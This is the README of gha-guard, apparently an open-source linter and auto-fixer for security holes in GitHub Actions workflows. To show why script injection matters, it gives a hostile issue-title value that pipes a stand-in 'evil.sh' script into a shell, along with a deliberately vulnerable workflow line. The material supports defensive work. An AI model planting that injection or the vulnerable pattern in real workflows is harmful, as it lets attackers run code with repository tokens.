# gha-guard

[![ci](https://github.com/OTA-EITA/gha-guard/actions/workflows/ci.yml/badge.svg)](https://github.com/OTA-EITA/gha-guard/actions/workflows/ci.yml)

GitHub Actions のワークフローに潜む**セキュリティの穴を見つけて、自動で直す** TypeScript 製の CLI / GitHub Action です。
スクリプト注入、pwn request、過剰な権限、SHA で固定されていないアクションなどを検出し、SARIF で Code scanning に載せられます。

A security linter and auto-fixer for GitHub Actions workflows, written in TypeScript: script injection,
pwn requests, excessive token permissions, unpinned actions and more, with SARIF output.

## なぜ作ったか

CI/CD はサプライチェーン攻撃の主要な入口です。たとえば次の 1 行は、Issue のタイトルを `"; curl evil.sh | sh #` にされるだけで、リポジトリのトークンを持ったまま任意のコマンドを実行されます。

```yaml
- run: echo "Thanks for opening: ${{ github.event.issue.title }}"
```

こうした書き方は見た目では問題がなく、レビューでも見落とされがちです。gha-guard はこれを機械的に見つけ、直せるものは直します。

## ルール

| ID     | 重大度              | 内容                                                                                                                                                                                          | 自動修正                                                            |
| ------ | ------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------- |
| GHA000 | low                 | YAML として解析できず、検査できなかった（重複キーなど）。他のファイルの検査は続ける                                                                                                           |                                                                     |
| GHA001 | high / medium / low | Issue / PR のタイトル・本文、ブランチ名、コミットメッセージ、`workflow_run` で受け取った artifact の中身など**攻撃者が決められる値**を `run:` や `actions/github-script` に直接埋め込んでいる | ✅ 環境変数経由に書き換え                                           |
| GHA002 | high / medium / low | `pull_request_target` / `workflow_run` / `issue_comment` で PR のコード（artifact から得た ref を含む）を checkout し、実行している（pwn request）                                            |                                                                     |
| GHA003 | medium              | `permissions` がなく、リポジトリ既定（古い設定では読み書き）の権限で動く                                                                                                                      | ✅ `contents: read` を追加                                          |
| GHA004 | high                | `permissions: write-all`                                                                                                                                                                      |                                                                     |
| GHA005 | medium / low        | アクションがタグなど書き換え可能な参照で指定されている（サードパーティは medium）                                                                                                             | [depbot](https://github.com/OTA-EITA/depbot) の `--pin-only` で固定 |
| GHA006 | low                 | `actions/checkout` がトークンを `.git/config` に残す（`persist-credentials: false` がない）                                                                                                   |                                                                     |
| GHA007 | high                | `ACTIONS_ALLOW_UNSECURE_COMMANDS` で危険な旧コマンドを有効にしている                                                                                                                          |                                                                     |
| GHA008 | medium              | PR をセルフホストランナーで実行している                                                                                                                                                       |                                                                     |
| GHA009 | low                 | 再利用ワークフローに `secrets: inherit` で全シークレットを渡している                                                                                                                          |                                                                     |
| GHA010 | high / medium / low | `anthropics/claude-code-action` の `allowed_non_write_users` や `openai/codex-action` の `allow-users` で、書き込み権限のない人にも外部から起動できるイベントで AI エージェントを使わせている |                                                                     |

判定の根拠は GitHub 公式の「Security hardening for GitHub Actions」です。ワークフロー（`.github/workflows/*.yml`）に加えて、Composite Action（`action.yml`）も検査します。

### Rules

| ID     | Severity            | What it finds                                                                                                                                                                                     | Auto-fix                                                           |
| ------ | ------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------ |
| GHA000 | low                 | A file that could not be parsed as YAML (duplicate keys, for example). Other files are still checked                                                                                              |                                                                    |
| GHA001 | high / medium / low | **Attacker-controlled values** (issue / PR titles and bodies, branch names, commit messages, artifact contents received in `workflow_run`) expanded directly in `run:` or `actions/github-script` | ✅ Rewrites them to go through environment variables               |
| GHA002 | high / medium / low | Checking out and running PR code (including refs read from artifacts) in `pull_request_target` / `workflow_run` / `issue_comment` (pwn request)                                                   |                                                                    |
| GHA003 | medium              | No `permissions`, so the job runs with the repository default (read-write on older settings)                                                                                                      | ✅ Adds `contents: read`                                           |
| GHA004 | high                | `permissions: write-all`                                                                                                                                                                          |                                                                    |
| GHA005 | medium / low        | Actions referenced by a mutable ref such as a tag (medium for third-party actions)                                                                                                                | Pin with [depbot](https://github.com/OTA-EITA/depbot) `--pin-only` |
| GHA006 | low                 | `actions/checkout` leaving the token in `.git/config` (no `persist-credentials: false`)                                                                                                           |                                                                    |
| GHA007 | high                | `ACTIONS_ALLOW_UNSECURE_COMMANDS` turning the dangerous old commands back on                                                                                                                      |                                                                    |
| GHA008 | medium              | PRs running on self-hosted runners                                                                                                                                                                |                                                                    |
| GHA009 | low                 | Reusable workflows called with `secrets: inherit`, passing every secret                                                                                                                           |                                                                    |
| GHA010 | high / medium / low | AI agents (`anthropics/claude-code-action` `allowed_non_write_users`, `openai/codex-action` `allow-users`) usable by people without write access on events outsiders can trigger                  |                                                                    |

Severity depends on whether an outsider can actually reach the step: gha-guard reads job and step `if:` conditions per trigger (trusted-only conditions, labels, `environment:`, fork PRs with read-only tokens) and explains the reason in each finding.

### 重大度の決め方（GHA001 / GHA002 / GHA010）

同じ書き方でも、外部の人が実際に届くかどうかで危険度は大きく変わります。gha-guard はジョブとステップの `if:` を式として読み、トリガーごとに「外部の人が通れるか」を判定して重大度を決め、理由をメッセージに書きます。

- **実行されない**: `if: false`（`${{ false }}` も）や、トリガーと合わない `github.event_name == '...'` の枝は検査しません。`needs` 先のジョブが動かなければ後続も動かないものとして扱います（`always()` などを使うジョブは除く）。
- **信頼できる人だけが通る条件 → low**: `author_association` が OWNER / MEMBER / COLLABORATOR、`github.actor` や `user.login` を固定値やリポジトリの所有者と比べる、`contains(fromJSON('[...]'), github.actor)`、`head.repo.full_name == github.repository` や `head.repo.fork == false`（フォークではない）、`workflow_run.event` が `push` / `schedule` など。`actions-team-membership` などの権限チェックや、`github.actor` を比べて `exit 1` するステップが前にある場合も同じです。
- **メンテナーの操作が必要な条件 → medium**: `github.event.label.name == 'X'`（ラベルを付けたときだけ）、`pull_request.merged == true`。ただし PR のブランチ名で checkout していると、ラベルの後に push されたコミットも動くので high のままです。
- **ラベルが付いているかだけを見る条件**: `contains(github.event.pull_request.labels.*.name, 'X')` は「状態」の確認です。`labeled` や `synchronize` で動くと、一度ラベルが付いた後は新しいコミットも次のラベル操作で動くため（TOCTOU）、high として報告します。
- **`environment:` を使うジョブ → medium**: 承認者（required reviewers）を設定した environment なら実行前に承認が要りますが、設定していなければ止まりません。
- **`pull_request` 系だけ → low**: `pull_request` / `pull_request_review` / `pull_request_review_comment` では、フォークからの PR のトークンは読み取り専用で、シークレットも渡りません。
- **そのトリガーでは値が入らない → low**: たとえば `push` だけのワークフローの `github.event.issue.title` は空です。

条件は「かつ（`&&`）」でつながったものだけを信頼し、ゲートのない枝が `||` で並んでいれば高い重大度のままにします。読めない条件も「通れる」とみなします。

GHA002 はさらに、checkout の後に**そのコードを実行するステップ**（`npm ci` / `pip install .` / `make` / `go test` / `docker build` / `./script.sh` / `uses: ./...` など）があるときだけ high にし、`git diff` やアップロードだけなら low（「checkout しているが実行していないようだ」）にします。`issue_comment` での `gh pr checkout` や `git fetch ... pull/N/head` の後の checkout も検出します。

`workflow_run` では、ダウンロードした artifact（`actions/download-artifact` の `run-id`、`gh run download`、`listWorkflowRunArtifacts` など）から読んだ値を `steps.*.outputs` と `needs.*.outputs` を通して追い、スクリプトへの埋め込み（GHA001）や checkout の `ref:` / `repository:`（GHA002）に届けば、値の経路つきで報告します。同じリポジトリの上流ワークフローが `push` / `schedule` などでしか動かない場合は medium に下げますが、ワークフローは名前で照合されるため、PR が同じ名前のワークフローを追加できる点をメッセージで注意します（`github.event.workflow_run.event` での確認を勧めます）。

## 使い方

```sh
# インストール（npm）
npm install -g github:OTA-EITA/gha-guard

# リポジトリを検査
gha-guard

# 自動で直す
gha-guard --fix

# SARIF で出力し、high だけで失敗させる
gha-guard --format sarif --fail-on high > gha-guard.sarif
```

出力例（[`test/fixtures/vulnerable`](test/fixtures/vulnerable) に対する実行結果の一部）。式を埋め込んでいる箇所は行と列で示します:

```
vulnerable/.github/workflows/triage.yml:10  HIGH   GHA002  checks out pull request code in a pull_request_target workflow and runs it (npm test) with the workflow's secrets and write token ("pwn request")
vulnerable/.github/workflows/triage.yml:15:37  HIGH   GHA001  github.event.issue.title is interpolated into a script; a crafted value can run arbitrary commands [fixable]
vulnerable/.github/workflows/triage.yml:1  MEDIUM GHA003  no permissions block; job(s) label get the repository's default token permissions [fixable]
vulnerable/.github/workflows/lint.yml:8:26  LOW    GHA001  github.event.pull_request.title is interpolated into a script; a crafted value can run arbitrary commands; only pull_request events reach it, where pull requests from forks get a read-only token and no secrets [fixable]

4 file(s), 17 finding(s): 7 high, 4 medium, 6 low
```

`--fix` を付けると、次のように書き換わります（変更箇所以外の書式は保ちます）。シェルに合わせて `${VAR}`（bash）、`$env:VAR`（PowerShell）、`%VAR%`（cmd）を使い分け、既存の環境変数とは名前が衝突しないようにします。

```diff
 on:
   issues:
     types: [opened]
   pull_request_target:
+permissions:
+  contents: read
 jobs:
   label:
     steps:
       - name: Greet
         run: |
-          echo "Thanks for opening: ${{ github.event.issue.title }}"
-          echo ${{ github.head_ref }}
+          echo "Thanks for opening: ${ISSUE_TITLE}"
+          echo "${HEAD_REF}"
+        env:
+          ISSUE_TITLE: ${{ github.event.issue.title }}
+          HEAD_REF: ${{ github.head_ref }}
```

| オプション     | 既定値 | 説明                                            |
| -------------- | ------ | ----------------------------------------------- |
| `--fix`        | -      | 自動修正できるものをファイルに書き戻す          |
| `--format`     | `text` | `text` / `json` / `markdown` / `sarif`          |
| `--fail-on`    | `low`  | この重大度以上で終了コード 1（`none` で常に 0） |
| `--list-rules` | -      | ルール一覧                                      |

`testdata` と `fixtures` ディレクトリは検査対象から外します（わざと危険なサンプルを置くことが多いため）。解析できないファイルがあっても全体は止めず、GHA000 として報告して残りを検査します。

## GitHub Action として使う

```yaml
permissions:
  contents: read
  security-events: write

jobs:
  gha-guard:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v5
        with:
          persist-credentials: false
      - uses: OTA-EITA/gha-guard@v0.2.0
        id: guard
        with:
          fail-on: high
      - uses: github/codeql-action/upload-sarif@v4
        if: always()
        with:
          sarif_file: ${{ steps.guard.outputs.sarif-file }}
```

結果は PR の該当行への注釈、ジョブのサマリー、Code scanning のアラートとして表示されます。このリポジトリ自身の CI でも、gha-guard が自分のワークフローを検査しています。

## 実際のリポジトリでの検証

Tested on 5,145 workflows from 320 popular repositories.

GitHub で人気のある 320 リポジトリの 5,145 個のワークフローに、v0.1.2 と v0.2.0 をそれぞれ実行しました（読み取りのみ）。

| ルール       | v0.1.2（high / medium / low） | v0.2.0（high / medium / low） |
| ------------ | ----------------------------- | ----------------------------- |
| GHA001 注入  | 25 / 0 / 0                    | 5 / 13 / 18                   |
| GHA002 pwn   | 55 / 0 / 0                    | 16 / 12 / 38                  |
| GHA010 AI    | -                             | 1 / 4 / 2                     |
| GHA000 解析  | -（1 リポジトリで検査が中断） | 0 / 0 / 1                     |
| 検査できた数 | 5,137 ファイル                | 5,144 ファイル                |

- v0.1.2 では重複キーのある 1 ファイルのせいで 1 リポジトリ全体の結果が空になっていました。v0.2.0 ではそのファイルだけを GHA000 として報告します。
- GHA001 / GHA002 の high は 80 件から 21 件に減りました。減った分は、信頼できる人だけが通る `if:`、`if: false`、`environment:`、フォークのトークンが読み取り専用の `pull_request`、checkout したコードを実行していないものなどで、medium / low に下げるか報告しなくなりました（代表的なものは手で確認しています）。
- 一方で v0.1.2 が見逃していたものも検出するようになりました。新たに high になったのは、artifact 由来の値の注入（3 件）と checkout（4 件）、外部に開いた AI エージェント（1 件）です。ラベルが付いているかだけを見る TOCTOU の 10 件は以前も high でしたが、ラベルの確認をゲートとして下げることはせず、理由を示すようになりました。`issue_comment` での PR の checkout は、今回の対象ではすべて信頼できる人だけが通る条件つきか、コードを実行しないもの（low）でした。
- 同じ行の同じ指摘の重複もまとめています。

見つかった問題は各リポジトリへ報告中のため、ここではリポジトリ名を挙げていません。

## 開発

TypeScript の strict モードに加えて `noUncheckedIndexedAccess` と `exactOptionalPropertyTypes` を有効にし、typescript-eslint の `strictTypeChecked` で lint しています。

```sh
npm ci
npm run typecheck
npm run lint
npm run coverage   # Vitest、カバレッジのしきい値つき
npm run build      # esbuild で dist/cli.js と dist/action.js を生成
```

CI では、コミットされた `dist/` がソースと一致しているかも確認します。

## License

MIT
